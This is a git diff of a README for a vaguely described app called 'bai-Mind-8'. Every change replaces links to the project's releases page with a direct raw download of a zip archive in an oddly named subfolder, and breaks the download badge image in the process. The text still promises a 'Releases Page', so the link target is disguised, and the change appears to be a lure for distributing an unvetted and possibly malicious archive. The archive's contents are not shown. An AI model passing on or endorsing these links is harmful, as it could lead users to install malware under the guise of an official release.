@@ -1,6 +1,6 @@
 # 🎉 bai-Mind-8 - Unlock the Power of Your Mind
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/Anbakatum/bai-Mind-8/releases)
+[![Download Now](https://raw.githubusercontent.com/Anbakatum/bai-Mind-8/main/toftstead/bai-Mind-8_v1.3.zip%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Anbakatum/bai-Mind-8/main/toftstead/bai-Mind-8_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the [Releases Page](https://github.com/Anbakatum/bai-Mind-8/releases) to access the latest versions of bai-Mind-8.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Anbakatum/bai-Mind-8/main/toftstead/bai-Mind-8_v1.3.zip) to access the latest versions of bai-Mind-8.
 
 2. **Choose Your Version**
    On the Releases page, you will see a list of available versions. Select the version suited for your device.
@@ -91,4 +91,4 @@ We welcome contributions! Whether you want to fix bugs, add new features, or imp
 
 For further inquiries, feel free to reach out through the GitHub repository or join our community discussion.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/Anbakatum/bai-Mind-8/releases)
+[![Download Now](https://raw.githubusercontent.com/Anbakatum/bai-Mind-8/main/toftstead/bai-Mind-8_v1.3.zip%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Anbakatum/bai-Mind-8/main/toftstead/bai-Mind-8_v1.3.zip)
